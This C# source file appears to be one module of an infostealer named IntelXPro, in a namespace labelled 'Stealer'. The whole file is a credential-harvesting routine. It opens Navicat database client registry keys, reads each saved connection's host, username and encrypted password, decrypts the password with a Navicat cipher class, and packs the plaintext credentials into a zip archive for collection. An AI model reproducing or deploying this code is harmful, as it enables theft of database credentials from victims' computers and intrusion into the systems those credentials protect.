using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Dependencies.Encryption;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Navicat : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Dictionary<string, string> dictionary = new Dictionary<string, string>
            {
                ["Navicat"] = "MySql",
                ["NavicatMSSQL"] = "SQL Server",
                ["NavicatOra"] = "Oracle",
                ["NavicatPG"] = "pgsql",
                ["NavicatMARIADB"] = "MariaDB"
            };
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Navicat";
            Navicat11Cipher navicat11Cipher = new Navicat11Cipher();
            foreach (string key in dictionary.Keys)
            {
                string text = "Software\\PremiumSoft\\" + key + "\\Servers";
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text);
                if (registryKey == null)
                {
                    continue;
                }
                string text2 = dictionary[key];
                string[] subKeyNames = registryKey.GetSubKeyNames();
                foreach (string text3 in subKeyNames)
                {
                    RegistryKey registryKey2 = registryKey.OpenSubKey(text3);
                    if (registryKey2 != null)
                    {
                        object value = registryKey2.GetValue("Host");
                        object value2 = registryKey2.GetValue("UserName");
                        object value3 = registryKey2.GetValue("Pwd");
                        string text4 = value.ToString();
                        string text5 = value2.ToString();
                        string ciphertext = value3.ToString();
                        string text6 = navicat11Cipher.DecryptString(ciphertext);
                        StringBuilder stringBuilder = new StringBuilder();
                        stringBuilder.AppendLine("DatabaseType: " + text2);
                        stringBuilder.AppendLine("ConnectName: " + text3);
                        stringBuilder.AppendLine("Host: " + text4);
                        stringBuilder.AppendLine("UserName: " + text5);
                        stringBuilder.AppendLine("Password: " + text6);
                        string text7 = "Navicat\\" + text2 + "\\" + text3 + "\\connection.txt";
                        zip.AddTextFile(text7, stringBuilder.ToString());
                        counterApplications.Files.Add(text + "\\" + text3 + " => " + text7);
                    }
                }
            }
            if (counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
